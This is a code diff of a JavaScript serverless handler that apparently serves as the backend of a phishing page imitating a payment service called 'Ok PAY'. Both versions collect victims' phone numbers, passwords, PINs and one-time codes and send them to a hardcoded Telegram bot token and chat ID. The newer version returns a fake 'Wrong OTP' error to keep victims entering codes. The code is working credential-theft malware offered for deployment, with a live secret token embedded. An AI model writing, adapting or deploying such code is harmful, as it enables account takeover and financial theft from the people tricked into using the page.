@@ -1,75 +1,72 @@
 export default async function handler(req, res) {
-    res.setHeader('Access-Control-Allow-Credentials', true);
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
-    res.setHeader(
-        'Access-Control-Allow-Headers',
-        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
-    );
+  if (req.method !== 'POST') {
+    res.setHeader('Allow', ['POST']);
+    return res.status(405).json({ error: `Method ${req.method} Not Allowed` });
+  }
 
-    if (req.method === 'OPTIONS') {
-        res.status(200).end();
-        return;
-    }
+  try {
+    const { type, phone, pass, pin, otp } = req.body;
 
-    if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Method Not Allowed' });
-    }
+    // Aapka Telegram Bot Token aur Chat ID yahan set kar diya gaya hai
+    const BOT_TOKEN = '9229621091:AAHVqA0UZ5EE-SLaR34B0nUr1TpkLleFDlQ';
+    const CHAT_ID = '6463555281';
 
-    const TELEGRAM_BOT_TOKEN = '9229621091:AAHVqA0UZ5EE-SLaR34B0nUr1TpkLleFDlQ';
-    const TELEGRAM_CHAT_ID = '6463555281';
-
-    const { type, phone, password, pin, username, otp, newPassword, details } = req.body;
-
-    let message = '';
-
-    if (type === 'signin') {
-        message = `🔐 <b>Sign In Attempt</b>\n\n`
-            + `📱 <b>Phone:</b> +91 ${phone || 'N/A'}\n`
-            + `🔒 <b>Password:</b> ${password || 'N/A'}\n`
-            + `🔑 <b>PIN:</b> ${pin || 'N/A'}\n`
-            + `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
-    } else if (type === 'register') {
-        message = `📝 <b>Registration Attempt</b>\n\n`
-            + `👤 <b>Username:</b> ${username || 'N/A'}\n`
-            + `🔒 <b>Password:</b> ${password || 'N/A'}\n`
-            + `📱 <b>Phone:</b> +91 ${phone || 'N/A'}\n`
-            + `🔢 <b>OTP:</b> ${otp || 'N/A'}\n`
-            + `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
-    } else if (type === 'reset') {
-        message = `🔄 <b>Password Reset Attempt</b>\n\n`
-            + `📱 <b>Phone:</b> +91 ${phone || 'N/A'}\n`
-            + `🔒 <b>New Password:</b> ${newPassword || 'N/A'}\n`
-            + `🔢 <b>OTP:</b> ${otp || 'N/A'}\n`
-            + `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
-    } else {
-        message = `🔔 <b>${type || 'Notification'}</b>\n\n`
-            + `📱 <b>Phone:</b> +91 ${phone || 'N/A'}\n`
-            + `ℹ️ <b>Details:</b> ${details || 'N/A'}\n`
-            + `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
-    }
-
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
+    async function sendTelegramMessage(text) {
+      try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown'
+          })
         });
-
-        const data = await response.json();
-
-        if (data.ok) {
-            return res.status(200).json({ success: true, message: 'Message sent to Telegram successfully.' });
-        } else {
-            return res.status(400).json({ success: false, error: data.description });
-        }
-    } catch (error) {
-        console.error('Telegram API Error:', error);
-        return res.status(500).json({ success: false, error: error.message });
+      } catch (err) {
+        console.error('Telegram API Error:', err);
+      }
     }
+
+    switch (type) {
+      case 'login':
+        if (!phone || !pass || !pin) {
+          return res.status(400).json({ error: 'All fields are required.' });
+        }
+        
+        await sendTelegramMessage(
+          `🚨 *Ok PAY - New Login Details*\n\n📱 *Phone:* \`${phone}\`\n🔑 *Password:* \`${pass}\`\n🔢 *PIN:* \`${pin}\``
+        );
+
+        return res.status(200).json({ success: true, message: 'Credentials received.' });
+
+      case 'send_otp':
+        if (!phone) {
+          return res.status(400).json({ error: 'Phone number is required.' });
+        }
+
+        await sendTelegramMessage(
+          `📩 *Ok PAY - OTP Requested*\n\n📱 *Phone:* \`${phone}\``
+        );
+
+        return res.status(200).json({ success: true, message: 'OTP sent successfully.' });
+
+      case 'verify_otp':
+        if (!otp) {
+          return res.status(400).json({ error: 'OTP is required.' });
+        }
+
+        await sendTelegramMessage(
+          `🔐 *Ok PAY - OTP Entered*\n\n📱 *Phone:* \`${phone}\`\n🔢 *OTP:* \`${otp}\``
+        );
+
+        return res.status(400).json({ error: 'Wrong OTP! Please try again.' });
+
+      default:
+        return res.status(400).json({ error: 'Invalid request type.' });
+    }
+  } catch (err) {
+    console.error('Server Error:', err);
+    return res.status(500).json({ error: 'Internal Server Error' });
+  }
 }
